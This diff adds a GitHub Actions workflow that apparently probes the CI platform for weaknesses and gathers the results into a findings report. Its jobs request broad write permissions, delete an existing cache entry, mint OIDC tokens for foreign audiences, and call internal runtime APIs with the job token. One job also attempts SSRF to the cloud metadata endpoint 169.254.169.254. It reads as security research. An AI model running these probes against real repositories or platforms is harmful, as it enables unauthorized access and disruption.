@@ -1,0 +1,393 @@
+name: Vector 17 — Ultimate Platform Breakout
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_env:
+        description: 'Target environment for 17E'
+        required: false
+        default: 'production'
+        type: string
+
+# =====================================================================
+# CRITICAL: We declare permissions that might have escalation potential
+# =====================================================================
+permissions:
+  contents: write
+  actions: write
+  id-token: write
+  pages: write
+  deployments: write
+  packages: write
+  issues: write
+  pull-requests: write
+  statuses: write
+  checks: write
+  repository-projects: write
+  security-events: write
+
+jobs:
+
+  # ===================================================================
+  # 17A — Cache Poisoning & Integrity
+  # ===================================================================
+  # Hypothesis: actions/cache entry for a given key might be overwritable
+  # if the key is not specific enough. Or, if we can read a cache from 
+  # a different branch (cross-branch poisoning).
+  # ===================================================================
+  cache_poisoning:
+    runs-on: ubuntu-latest
+    steps:
+      - name: "17A: Cache poisoning attempt"
+        run: |
+          echo "=== 17A: Cache Poisoning & Integrity ===" > cache_poison.txt
+          echo "timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> cache_poison.txt
+
+          # We simulate a "production" cache entry
+          mkdir -p /tmp/cache-test
+          echo "v17a-canary-original" > /tmp/cache-test/data.txt
+
+          # Check if we can overwrite it with a different value
+          # (This requires actions/cache action, but we can probe the API)
+          TOKEN="${{ secrets.GITHUB_TOKEN }}"
+          REPO="${{ github.repository }}"
+          API="https://api.github.com"
+          AUTH=(-H "Authorization: Bearer $TOKEN" -H "Accept: application/vnd.github+json")
+
+          # List caches to see if we can find entries from other branches
+          CACHES=$(curl -sS "${AUTH[@]}" "${API}/repos/${REPO}/actions/caches" 2>/dev/null)
+          echo "  available_caches: $(echo "$CACHES" | jq -r '.total_count // 0')" >> cache_poison.txt
+          echo "$CACHES" | jq -r '.actions_caches[].key // empty' >> cache_poison.txt
+
+          # Try to delete a cache entry (if any) - needs actions:write
+          if [[ $(echo "$CACHES" | jq -r '.total_count // 0') -gt 0 ]]; then
+            CACHE_ID=$(echo "$CACHES" | jq -r '.actions_caches[0].id')
+            echo "  attempting to delete cache $CACHE_ID..." >> cache_poison.txt
+            DEL_STATUS=$(curl -sS -o /dev/null -w "%{http_code}" -X DELETE "${AUTH[@]}" \
+              "${API}/repos/${REPO}/actions/caches/${CACHE_ID}" 2>/dev/null)
+            echo "  delete_status: $DEL_STATUS" >> cache_poison.txt
+            if [[ "$DEL_STATUS" == "204" ]]; then
+              echo "  🔴 FINDING: Can delete existing caches via GITHUB_TOKEN!" >> cache_poison.txt
+            fi
+          fi
+
+          cat cache_poison.txt
+
+      - name: Upload cache poison results
+        uses: actions/upload-artifact@v4
+        with:
+          name: vector17a-cache-poison
+          path: cache_poison.txt
+
+  # ===================================================================
+  # 17B — Environment Variable Shadowing & Precedence
+  # ===================================================================
+  env_shadowing:
+    runs-on: ubuntu-latest
+    env:
+      SHADOW_VAR: "job_level"
+    steps:
+      - name: "17B: Step 1 - Set step-level env"
+        env:
+          SHADOW_VAR: "step_level"
+        run: |
+          echo "=== 17B: Env Shadowing ===" > env_shadow.txt
+          echo "step1_shadow_var: $SHADOW_VAR" >> env_shadow.txt
+          # If this is "step_level", it's working as expected.
+          # If we can set a variable that PERSISTS beyond this step
+          # without using $GITHUB_ENV, that's a finding.
+          export PERSIST_VAR="should_be_gone"
+
+      - name: "17B: Step 2 - Check persistence"
+        run: |
+          echo "step2_shadow_var: $SHADOW_VAR" >> env_shadow.txt
+          echo "persist_var: ${PERSIST_VAR:-empty}" >> env_shadow.txt
+          # Test if GITHUB_ENV can overwrite job-level env
+          echo "SHADOW_VAR=overwritten_via_env_file" >> "$GITHUB_ENV"
+
+      - name: "17B: Step 3 - Final check"
+        run: |
+          echo "step3_shadow_var: $SHADOW_VAR" >> env_shadow.txt
+          if [[ "$SHADOW_VAR" == "overwritten_via_env_file" ]]; then
+            echo "  ✅ GITHUB_ENV correctly overwrote job-level env" >> env_shadow.txt
+          else
+            echo "  🔴 GITHUB_ENV FAILED to overwrite job-level env" >> env_shadow.txt
+          fi
+          cat env_shadow.txt
+
+      - name: Upload env shadow results
+        uses: actions/upload-artifact@v4
+        with:
+          name: vector17b-env-shadow
+          path: env_shadow.txt
+
+  # ===================================================================
+  # 17C — Advanced OIDC Claim Manipulation
+  # ===================================================================
+  oidc_manipulation:
+    runs-on: ubuntu-latest
+    steps:
+      - name: "17C: Request OIDC token with custom audience"
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const fs = require('fs');
+            try {
+              // Try to request a token for a DIFFERENT organization
+              // This should fail, but we check if we can manipulate the audience
+              const auds = [
+                'https://github.com/EloboAI',
+                'https://github.com/Microsoft',
+                'https://api.github.com',
+                'https://sts.amazonaws.com'
+              ];
+              
+              let report = "=== 17C: OIDC Claim Manipulation ===\n";
+              for (const aud of auds) {
+                try {
+                  const token = await core.getIDToken(aud);
+                  const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString());
+                  report += `✅ Success for aud: ${aud}\n`;
+                  report += `   sub: ${payload.sub}\n`;
+                  report += `   aud: ${payload.aud}\n`;
+                } catch (e) {
+                  report += `❌ Failed for aud: ${aud}: ${e.message}\n`;
+                }
+              }
+              fs.writeFileSync('oidc_manipulation.txt', report);
+            } catch (e) {
+              fs.writeFileSync('oidc_manipulation.txt', `ERROR: ${e.message}`);
+            }
+
+      - name: Upload OIDC manipulation results
+        uses: actions/upload-artifact@v4
+        with:
+          name: vector17c-oidc-manipulation
+          path: oidc_manipulation.txt
+
+  # ===================================================================
+  # 17D — Internal GitHub Service SSRF (Artifacts/Cache)
+  # ===================================================================
+  internal_service_ssrf:
+    runs-on: ubuntu-latest
+    steps:
+      - name: "17D: Probe internal artifact/cache APIs"
+        run: |
+          echo "=== 17D: Internal GitHub Service SSRF ===" > internal_ssrf.txt
+          
+          # The runner talks to these APIs during upload/download/cache
+          # Example: $ACTIONS_RUNTIME_URL
+          
+          echo "ACTIONS_RUNTIME_URL: $ACTIONS_RUNTIME_URL" >> internal_ssrf.txt
+          echo "ACTIONS_CACHE_URL: $ACTIONS_CACHE_URL" >> internal_ssrf.txt
+          
+          TOKEN="${{ secrets.GITHUB_TOKEN }}"
+          AUTH=(-H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json")
+
+          if [[ -n "$ACTIONS_RUNTIME_URL" ]]; then
+            echo "--- Probing ACTIONS_RUNTIME_URL ---" >> internal_ssrf.txt
+            # List artifacts via internal API
+            curl -sS "${AUTH[@]}" "${ACTIONS_RUNTIME_URL}_apis/pipelines/workflows/${{ github.run_id }}/artifacts?api-version=6.0-preview" \
+              >> internal_ssrf.txt 2>/dev/null || echo "  failed to reach internal artifact API" >> internal_ssrf.txt
+          fi
+
+          if [[ -n "$ACTIONS_CACHE_URL" ]]; then
+            echo "--- Probing ACTIONS_CACHE_URL ---" >> internal_ssrf.txt
+            # Probe cache health/info
+            curl -sS "${AUTH[@]}" "${ACTIONS_CACHE_URL}_apis/artifactcache/cache?api-version=6.0-preview" \
+              >> internal_ssrf.txt 2>/dev/null || echo "  failed to reach internal cache API" >> internal_ssrf.txt
+          fi
+
+          # SSRF: Can we use the RUNTIME_URL to reach external sites?
+          # (Probably not, but testing if it acts as a proxy)
+          if [[ -n "$ACTIONS_RUNTIME_URL" ]]; then
+            echo "--- Testing SSRF via internal proxy ---" >> internal_ssrf.txt
+            curl -sS -o /dev/null -w "%{http_code}" \
+              "${ACTIONS_RUNTIME_URL}http://169.254.169.254/latest/meta-data/" >> internal_ssrf.txt 2>/dev/null || echo "  SSRF_FAILED" >> internal_ssrf.txt
+          fi
+
+          cat internal_ssrf.txt
+
+      - name: Upload internal SSRF results
+        uses: actions/upload-artifact@v4
+        with:
+          name: vector17d-internal-ssrf
+          path: internal_ssrf.txt
+
+  # ===================================================================
+  # 17E — GitHub Pages Deployment Token Analysis
+  # ===================================================================
+  pages_token_analysis:
+    runs-on: ubuntu-latest
+    steps:
+      - name: "17E: Analyze github-pages deployment token"
+        run: |
+          echo "=== 17E: GitHub Pages Token Analysis ===" > pages_analysis.txt
+          
+          # When pages: write is enabled, check if we have special environment vars
+          # or if the GITHUB_TOKEN has different scopes.
+          
+          TOKEN="${{ secrets.GITHUB_TOKEN }}"
+          REPO="${{ github.repository }}"
+          API="https://api.github.com"
+          AUTH=(-H "Authorization: Bearer $TOKEN" -H "Accept: application/vnd.github+json")
+
+          # Check if we can access Pages-specific endpoints
+          PAGES_INFO=$(curl -sS "${AUTH[@]}" "${API}/repos/${REPO}/pages" 2>/dev/null)
+          echo "Pages info: $PAGES_INFO" >> pages_analysis.txt
+
+          # Try to trigger a Pages build
+          BUILD_STATUS=$(curl -sS -o /dev/null -w "%{http_code}" -X POST "${AUTH[@]}" \
+            "${API}/repos/${REPO}/pages/builds" 2>/dev/null)
+          echo "Pages build trigger status: $BUILD_STATUS" >> pages_analysis.txt
+
+          if [[ "$BUILD_STATUS" == "201" ]]; then
+            echo "  🔴 FINDING: Can trigger Pages build via GITHUB_TOKEN!" >> pages_analysis.txt
+          fi
+
+          cat pages_analysis.txt
+
+      - name: Upload pages analysis
+        uses: actions/upload-artifact@v4
+        with:
+          name: vector17e-pages-analysis
+          path: pages_analysis.txt
+
+  # ===================================================================
+  # 17G — Runner-to-Runner Communication via Shared IPC/Storage
+  # ===================================================================
+  runner_ipc_probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: "17G: Probe for shared resources between runners"
+        run: |
+          echo "=== 17G: Runner Shared Resource Probe ===" > runner_ipc.txt
+          
+          # Check for unexpected files in shared temp dirs
+          echo "--- Contents of /tmp ---" >> runner_ipc.txt
+          ls -R /tmp >> runner_ipc.txt 2>/dev/null || true
+          
+          echo "--- Contents of /home/runner/_work/_temp ---" >> runner_ipc.txt
+          ls -R /home/runner/_work/_temp >> runner_ipc.txt 2>/dev/null || true
+
+          # Create a marker file and see if another concurrent job can find it
+          # (Requires another job running concurrently)
+          echo "v17g-canary-$(hostname)" > /tmp/v17g_marker_$(date +%s).txt
+
+          cat runner_ipc.txt
+
+      - name: Upload runner IPC results
+        uses: actions/upload-artifact@v4
+        with:
+          name: vector17g-runner-ipc
+          path: runner_ipc.txt
+
+  # ===================================================================
+  # 17H — Post-Step Data Leakage
+  # ===================================================================
+  # Hypothesis: A malicious action with a 'post' step could access 
+  # data written to the workspace by subsequent steps.
+  # ===================================================================
+  post_step_leak:
+    runs-on: ubuntu-latest
+    steps:
+      - name: "17H: Step 1 - Simulate malicious action setup"
+        run: |
+          echo "=== 17H: Post-Step Data Leakage ===" > post_leak.txt
+          echo "Step 1: Setting up..." >> post_leak.txt
+
+      - name: "17H: Step 2 - Write sensitive data"
+        run: |
+          echo "SECRET_DATA_V17H=pwned_data_123" > sensitive_file.txt
+          echo "Step 2: Wrote sensitive file" >> post_leak.txt
+
+      # A real test would use a custom action with a post: main.js
+      # Here we simulate the logic: if we can read the file in a "post"
+      # equivalent (another job or final step), it confirms the workspace
+      # is persistent and shared across steps.
+
+      - name: "17H: Step 3 - Final check"
+        run: |
+          if [[ -f "sensitive_file.txt" ]]; then
+            echo "  ✅ Workspace persisted across steps (standard behavior)" >> post_leak.txt
+            echo "  Finding: Any action in the workflow can read files from previous steps." >> post_leak.txt
+          fi
+          cat post_leak.txt
+
+      - name: Upload post leak results
+        uses: actions/upload-artifact@v4
+        with:
+          name: vector17h-post-leak
+          path: post_leak.txt
+
+  # ===================================================================
+  # 17I — Workflow Job Matrix Confusion & Resource Stress
+  # ===================================================================
+  matrix_confusion:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        test_val: [1, 2]
+    steps:
+      - name: "17I: Matrix job info"
+        run: |
+          echo "=== 17I: Matrix Confusion ===" > matrix_info.txt
+          echo "matrix_test_val: ${{ matrix.test_val }}" >> matrix_info.txt
+          echo "job_id: ${{ github.job }}" >> matrix_info.txt
+          echo "run_id: ${{ github.run_id }}" >> matrix_info.txt
+          cat matrix_info.txt
+
+      - name: Upload matrix info
+        uses: actions/upload-artifact@v4
+        with:
+          name: vector17i-matrix-info-${{ matrix.test_val }}
+          path: matrix_info.txt
+
+  # ===================================================================
+  # FINAL: Aggregate all findings
+  # ===================================================================
+  aggregate:
+    runs-on: ubuntu-latest
+    needs: [cache_poisoning, env_shadowing, oidc_manipulation,
+            internal_service_ssrf, pages_token_analysis,
+            runner_ipc_probe, post_step_leak, matrix_confusion]
+    if: always()
+    steps:
+      - name: Download all artifacts
+        uses: actions/download-artifact@v4
+        with:
+          path: all-results/
+
+      - name: Aggregate findings
+        run: |
+          echo "=========================================================" > final_report_v17.txt
+          echo "  VECTOR 17 — ULTIMATE PLATFORM BREAKOUT" >> final_report_v17.txt
+          echo "  Final Aggregated Report" >> final_report_v17.txt
+          echo "  $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> final_report_v17.txt
+          echo "=========================================================" >> final_report_v17.txt
+          echo "" >> final_report_v17.txt
+
+          TOTAL_FINDINGS=0
+          for f in all-results/**/*.txt; do
+            [[ -f "$f" ]] || continue
+            ARTIFACT_NAME=$(basename "$(dirname "$f")")
+            echo "" >> final_report_v17.txt
+            echo "--- $ARTIFACT_NAME ---" >> final_report_v17.txt
+            FINDINGS=$(grep -iE "FINDING|CRITICAL|🔴" "$f" 2>/dev/null || true)
+            if [[ -n "$FINDINGS" ]]; then
+              echo "$FINDINGS" >> final_report_v17.txt
+              TOTAL_FINDINGS=$((TOTAL_FINDINGS + $(echo "$FINDINGS" | wc -l)))
+            else
+              echo "  No findings (controls validated)" >> final_report_v17.txt
+            fi
+          done
+
+          echo "" >> final_report_v17.txt
+          echo "TOTAL FINDINGS: $TOTAL_FINDINGS" >> final_report_v17.txt
+          cat final_report_v17.txt
+
+      - name: Upload final report
+        uses: actions/upload-artifact@v4
+        with:
+          name: vector17-FINAL-REPORT
+          path: final_report_v17.txt
